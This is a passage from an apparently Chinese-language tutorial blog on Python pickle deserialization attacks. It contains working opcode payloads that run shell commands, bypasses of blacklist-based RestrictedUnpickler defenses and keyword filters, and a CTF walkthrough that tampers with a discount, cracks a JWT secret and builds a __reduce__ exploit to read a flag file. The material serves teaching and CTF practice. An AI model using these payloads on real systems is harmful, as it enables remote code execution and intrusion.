aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>解读一下<br>字符<code>c</code>，往后读取两行，得到主函数和类，<code>__main__.tttang</code><br>字符<code>)</code>，向栈中压入空元祖<code>()</code><br>字符<code>&#125;</code>，向栈中压入空字典<code>&#123;&#125;</code><br>字符<code>X</code>，读取四位<code>\\x0C\\x00\\x00\\x00__setstate__</code>,得到<code>__setstate__</code><br>字符<code>c</code>，向后读取两行，得到函数<code>os.system</code><br>字符<code>s</code>，将第一个和第二个元素作为键值对，添加到第三个元素中，此时也就是<code>&#123;__main.tttang:()&#125;，__setstate__,os.system</code><br>字符<code>b</code>，第一个元素出栈，此时也就是<code>&#123;&#39;__setstate__&#39;: os.system&#125;</code>,此时执行一次<code>setstate(state)</code><br>字符<code>X</code>，往后读取四位<code>x06\\x00\\x00\\x00whoami</code>，即<code>whoami</code><br>字符<code>b</code>，弹出元素<code>whoami</code>此时<code>state</code>为<code>whoami</code>，执行<code>os.system(whoami)</code><br>字符<code>.</code>，结束反序列化</p>\n<p>测试代码如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">tttang</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            self<span class=\"token punctuation\">.</span>name<span class=\"token operator\">=</span><span class=\"token string\">\"quan9i\"</span>\na<span class=\"token operator\">=</span><span class=\"token string\">b'c__main__\\ntttang\\n)\\x81&#125;X\\x0C\\x00\\x00\\x00__setstate__cos\\nsystem\\nsbX\\x06\\x00\\x00\\x00whoamib.'</span>\nb<span class=\"token operator\">=</span>pickle<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/121279fdfaef4889ac589b97b5dda479.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"界限突破（绕WAF）\"><a href=\"#界限突破（绕WAF）\" class=\"headerlink\" title=\"界限突破（绕WAF）\"></a>界限突破（绕WAF）</h2><h3 id=\"黑名单绕过\"><a href=\"#黑名单绕过\" class=\"headerlink\" title=\"黑名单绕过\"></a>黑名单绕过</h3><p>官方在声明Python反序列化时就已经意识到了其具有危险性，自然有一定的方法来进行防护。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>官方给出的安全反序列化是继承了<code>pickle.Pickler</code>类，并重载了<code>find_class</code>方法</p></blockquote>\n<p>常见的是设置了一些黑名单来进行绕过，示例如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n<span class=\"token keyword\">import</span> io\n<span class=\"token keyword\">import</span> builtins\n__all__ <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'PickleSerializer'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">RestrictedUnpickler</span><span class=\"token punctuation\">(</span>pickle<span class=\"token punctuation\">.</span>Unpickler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    blacklist<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'eval'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'exec'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'__import__'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'exit'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'input'</span><span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">find_class</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>module<span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> module <span class=\"token operator\">==</span> <span class=\"token string\">\"builtins\"</span> <span class=\"token keyword\">and</span> name <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> self<span class=\"token punctuation\">.</span>blacklist<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>builtins<span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">raise</span> pickle<span class=\"token punctuation\">.</span>UnpicklingError<span class=\"token punctuation\">(</span><span class=\"token string\">\"global '%s.%s' is forbidden\"</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>module <span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里设置了黑名单，禁止利用<code>eval</code>和<code>exec</code>等函数<br>但我们会发现这里<code>getattr</code>没有被ban，<code>__builtins__</code>中存在着很多函数，这就意味着我们可以<code>builtins.getattr(&#39;builtins&#39;, &#39;eval&#39;)</code>来获取eval等黑名单函数。<br>构造payload如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">builtins<span class=\"token punctuation\">.</span><span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>builtins<span class=\"token punctuation\">,</span> <span class=\"token string\">'eval'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token string\">'__import__(\"os\").system(\"whoami\")'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>该如何编写对应的opcode呢？<br>一步步来即可</p>\n<p>首先，构造出<code>builtins.getattr</code>，这里的话就用<code>c</code>操作符来调用出模块和函数，因此这里的话就写出了</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">cbuiltins\n<span class=\"token builtin\">getattr</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>接下来压入的话会发现，其中含有个对象，而其他压入的都是字符串，如果直接压入的话会出错，这里的话可以这样</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">builtins <span class=\"token operator\">=</span> builtins<span class=\"token punctuation\">.</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'builtins'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>构造一下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">cbuiltins\n<span class=\"token builtin\">globals</span>  <span class=\"token comment\">#得到builtins.globals</span>\ncbuiltins\n<span class=\"token builtin\">getattr</span>\n<span class=\"token punctuation\">(</span>cbuiltins\n<span class=\"token builtin\">dict</span>\nS<span class=\"token string\">'get'</span>\ntR<span class=\"token punctuation\">.</span>   <span class=\"token comment\">#获取到globals中的dict类中的get方法</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>接下来再用<code>dict.get</code>从<code>globals</code>中就获取<code>builtins</code>就可以</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">cbuiltins\n<span class=\"token builtin\">getattr</span>\n<span class=\"token punctuation\">(</span>cbuiltins\n<span class=\"token builtin\">dict</span>\nS<span class=\"token string\">'get'</span>\ntR<span class=\"token punctuation\">(</span>cbuiltins\n<span class=\"token builtin\">globals</span>   <span class=\"token comment\">#得到globals()</span>\n<span class=\"token punctuation\">(</span>tRS<span class=\"token string\">'builtins'</span> <span class=\"token comment\">#读取builtins</span>\ntR<span class=\"token punctuation\">.</span> <span class=\"token comment\">#t是与(形成元组，R是执行，师傅们自行解读一下可以就理解了</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>写个简单的demo测试一下是否成功构造出了<code>builtins</code></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle<span class=\"token punctuation\">,</span>builtins\n\npayload<span class=\"token operator\">=</span><span class=\"token triple-quoted-string string\">b\"\"\"cbuiltins\ngetattr\n(cbuiltins\ndict\nS'get'\ntR(cbuiltins\nglobals\n(tRS'builtins'\ntR.\n\"\"\"</span>\na<span class=\"token operator\">=</span>pickle<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/c537ad0a09da447d85723b750bb96bdc.png\" alt=\"在这里插入图片描述\"><br>接下来只需要构造eval就可以了，构造最终payload如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token triple-quoted-string string\">b\"\"\"cbuiltins\ngetattr\n(cbuiltins\ngetattr\n(cbuiltins\ndict\nS'get'\ntR(cbuiltins\nglobals\n(tRS'builtins'\ntRS'eval'\ntRp1\n(S'__import__(\"os\").system(\"whoami\")'\ntR.\"\"\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/4d2b55a8fa5f47b5910c9d85090b6ce2.png\" alt=\"在这里插入图片描述\"><br>这个是通过R操作符实现的函数执行，也可以通过O操作符和i操作符实现，这里借用一下<code>枫霄云</code>大师傅的opcode</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">o操作码：\n<span class=\"token string\">b'\\x80\\x03(cbuiltins\\ngetattr\\np0\\ncbuiltins\\ndict\\np1\\nX\\x03\\x00\\x00\\x00getop2\\n0(g2\\n(cbuiltins\\nglobals\\noX\\x0C\\x00\\x00\\x00__builtins__op3\\n(g0\\ng3\\nX\\x04\\x00\\x00\\x00evalop4\\n(g4\\nX\\x21\\x00\\x00\\x00__import__(\"os\").system(\"whoami\")o.'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h3 id=\"关键词绕过\"><a href=\"#关键词绕过\" class=\"headerlink\" title=\"关键词绕过\"></a>关键词绕过</h3><p>之前提到变量覆盖的时候，用到了变量名<code>key</code>，而如果禁止使用这个关键词，我们该怎么办呢，有以下几种方法</p>\n<h4 id=\"V操作符绕过\"><a href=\"#V操作符绕过\" class=\"headerlink\" title=\"V操作符绕过\"></a>V操作符绕过</h4><p>这里可以借用<code>V</code>操作符来实现关键字绕过,<code>V</code>操作符可以实例化一个<code>unicode</code>字符串对象。<br>我们之前的payload</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">c__main__\nsecret\n<span class=\"token punctuation\">(</span>S<span class=\"token string\">'key'</span>\nS<span class=\"token string\">'tttang'</span>\ndb<span class=\"token punctuation\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>修改过后的payload</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">c__main__\nsecret\n<span class=\"token punctuation\">(</span>V\\u006bey\nS<span class=\"token string\">'tttang'</span>\ndb<span class=\"token punctuation\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/8a699c30b063496fa25499106407ad31.png\" alt=\"在这里插入图片描述\"><br>可以发现成功实现变量覆盖</p>\n<h4 id=\"十六进制绕过\"><a href=\"#十六进制绕过\" class=\"headerlink\" title=\"十六进制绕过\"></a>十六进制绕过</h4><p><code>S</code>操作符是可以识别十六进制的，因此这里也可以对字符进行十六进制编码，从而绕过，构造payload如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">c__main__\nsecret\n<span class=\"token punctuation\">(</span>S<span class=\"token string\">'\\x6bey'</span>\nS<span class=\"token string\">'tttang'</span>\ndb<span class=\"token punctuation\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/a0a14c52b5444c47a7879bdb96c403a4.png\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"内置函数获取关键字\"><a href=\"#内置函数获取关键字\" class=\"headerlink\" title=\"内置函数获取关键字\"></a>内置函数获取关键字</h4><p>当我们引用某个模块时，我们可以通过<code>sys.modules[xxx]</code>来获取其全部属性，然后我们可以输出全部属性，示例如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> secret\n<span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dir</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>modules<span class=\"token punctuation\">[</span><span class=\"token string\">'secret'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/ad702588b91843e4993aaa2391307f53.png\" alt=\"在这里插入图片描述\"><br>成功找到关键词key，但发现这里是列表的形式(pickle不支持列表索引)<br>所以这里的话我们可以用函数<code>reversed()</code>将列表反序，然后用<code>next()</code>函数指向关键词从而实现输出关键词，示例如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> secret\n<span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">reversed</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dir</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>modules<span class=\"token punctuation\">[</span><span class=\"token string\">'secret'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/b457edd5346e4bcc962c3d75134f29f9.png\" alt=\"在这里插入图片描述\"><br>接下来只需要构造写出对应opcode即可<br>先写dir</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token punctuation\">(</span>c__main__\nsecret\ni__builtin__\n<span class=\"token builtin\">dir</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时再写<code>reversed</code>(因为过程是一样的，所以直接在c前面添加括号，在后面加i再接调用模块就可以)</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>c__main__\nsecret\ni__builtin__\n<span class=\"token builtin\">dir</span>\ni__builtin__\n<span class=\"token builtin\">reversed</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>最后写next</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>c__main__\nsecret\ni__builtin__\n<span class=\"token builtin\">dir</span>\ni__builtin__\n<span class=\"token builtin\">reversed</span>\ni__builtin__\n<span class=\"token builtin\">next</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>接下来检验一下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> secret\n<span class=\"token keyword\">import</span> pickle\n<span class=\"token keyword\">import</span> sys\nopcode<span class=\"token operator\">=</span><span class=\"token triple-quoted-string string\">b'''(((c__main__\nsecret\ni__builtin__\ndir\ni__builtin__\nreversed\ni__builtin__\nnext\n.'''</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>pickle<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>opcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://img-blog.csdnimg.cn/de2f4cc7e44e40bd8b2fc048b82ee9dc.png\" alt=\"在这里插入图片描述\"><br>成功输出<code>key</code>，接下来我们去修改一下之前的payload，把key改成这个，就可以啦</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n<span class=\"token keyword\">import</span> secret\n\npayload<span class=\"token operator\">=</span><span class=\"token triple-quoted-string string\">b'''c__main__\nsecret\n((((c__main__\nsecret\ni__builtin__\ndir\ni__builtin__\nreversed\ni__builtin__\nnext\nS'tttang'\ndb.'''</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'before:'</span><span class=\"token punctuation\">,</span>secret<span class=\"token punctuation\">.</span>key<span class=\"token punctuation\">)</span>\n\noutput<span class=\"token operator\">=</span>pickle<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'output:'</span><span class=\"token punctuation\">,</span>output<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'after:'</span><span class=\"token punctuation\">,</span>secret<span class=\"token punctuation\">.</span>key<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://img-blog.csdnimg.cn/75454e4734f14785b399fa703ca2ce80.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h1><h2 id=\"CISCN2019-华北赛区-Day1-Web2-ikun\"><a href=\"#CISCN2019-华北赛区-Day1-Web2-ikun\" class=\"headerlink\" title=\"[CISCN2019 华北赛区 Day1 Web2]ikun\"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>进入后发现有登录和注册界面，常规操作先注册后登录<br><img src=\"https://img-blog.csdnimg.cn/673af6bc1a0040769accd70604db4e60.png\" alt=\"在这里插入图片描述\"><br>提示要买到lv6，下划后发现可以买等级<br><img src=\"https://img-blog.csdnimg.cn/e7e2cf22705742cfb3078efd83b2aad8.png\" alt=\"在这里插入图片描述\"><br>这里没有lv6，点击下一页看看<br>仍然没有找到lv6，但发现参数是GET型传参<br><img src=\"https://img-blog.csdnimg.cn/471adc753fae40de949e05288ee170fe.png\" alt=\"在这里插入图片描述\"><br>这意味着我们可以写个小脚本来查找lv6所在位置<br>发现lv3对应的代码是lv3.png，那么lv6对应的就是lv6.png<br><img src=\"https://img-blog.csdnimg.cn/4d9596cc10f244a8ba3af9dfcf8b7e66.png\" alt=\"在这里插入图片描述\"><br>脚本如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> time\n<span class=\"token keyword\">import</span> requests\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://8e197801-2f87-4e36-aee6-a2390b0f391e.node4.buuoj.cn:81/shop?page=\"</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">300</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token string\">\"lv6.png\"</span> <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">break</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://img-blog.csdnimg.cn/3a7c901e63f5458e859d328d0176acce.png\" alt=\"在这里插入图片描述\"><br>181页，找到后发现价格是天价，买不起<br><img src=\"https://img-blog.csdnimg.cn/06faf3f3231146bc9abd03c462aa7e96.png\" alt=\"在这里插入图片描述\"><br>这里抓包看一下<br><img src=\"https://img-blog.csdnimg.cn/92c5ad1c68d64115809d6f2ef28eb6b8.png\" alt=\"在这里插入图片描述\"><br>发现可以修改折扣，把这个discount修改为<code>0.00000000000001</code>然后发包<br><img src=\"https://img-blog.csdnimg.cn/dcb6e769220d4ba3a078a560fce44404.png\" alt=\"在这里插入图片描述\"><br>跳转到了另一个界面但无权限访问<br>再抓包<img src=\"https://img-blog.csdnimg.cn/65b9dd775c054ff7a4348cd4c4cb874e.png\" alt=\"在这里插入图片描述\"><br>发现JWT，解码一下（解码网站<a href=\"https://jwt.io/\">https://jwt.io/</a>）<br><img src=\"https://img-blog.csdnimg.cn/b56f6dbd86ae467196fa3de42b48c09a.png\" alt=\"在这里插入图片描述\"><br>我们这里想实现修改root为<code>admin</code>，需要有密钥，爆破密钥可以用工具<code>c-jwt-cracker</code>得到，链接如下<br><a href=\"https://github.com/brendan-rius/c-jwt-cracker\">https://github.com/brendan-rius/c-jwt-cracker</a><br>破解后得到密钥为<code>1Kun</code><img src=\"https://img-blog.csdnimg.cn/32ae5f24e6d84b18a865acb37a0e4857.png\" alt=\"在这里插入图片描述\"><br>抓包，将得到的值赋给JWT，再发包<br><img src=\"https://img-blog.csdnimg.cn/9d3488359a9e4c51af39485f955af0b8.png\" alt=\"在这里插入图片描述\"><br>手给我点废了也没点出来什么东西，这个时候才想起来看看源代码，又是被自己蠢到的一天<img src=\"https://img-blog.csdnimg.cn/52153055a8624b6b821b2dc8cc102df3.png\" alt=\"在这里插入图片描述\">发现源码，下载下来看一下<br>在<code>admin.py</code>中发现<br><img src=\"https://img-blog.csdnimg.cn/3721787a720344529f87a864c72134fc.png\" alt=\"在这里插入图片描述\"><br>有<code>loads</code>,这意味着存在Pickle反序列化，我们可以写个有reduce的类，然后在里面写入想要执行的命令，进行序列化，接下来传值给become就可以了<br>这里结果是return形式的，而不是print，所以<code>os.system</code>没回显，这里了解到<code>commands.getoutput</code>是有回显的，因此用它来执行命令，构造exp如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n<span class=\"token keyword\">import</span> urllib\n<span class=\"token keyword\">import</span> commands\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">flag</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__reduce__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>commands<span class=\"token punctuation\">.</span>getoutput<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ls /'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\na <span class=\"token operator\">=</span> flag<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>urllib<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/69552beeeaf84d2e80d1dd2bbdd77187.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/1f6e8defd4ba482384525085536f98e3.png\" alt=\"在这里插入图片描述\"><br>接下来同理，换一下语句就可以查看flag了</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n<span class=\"token keyword\">import</span> urllib\n<span class=\"token keyword\">import</span> commands\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">flag</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__reduce__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>commands<span class=\"token punctuation\">.</span>getoutput<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token string\">'cat /flag.txt'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\na <span class=\"token operator\">=</span> flag<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>urllib<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/4842ccdb706746d8afb121d5aa3f11ab.png\" 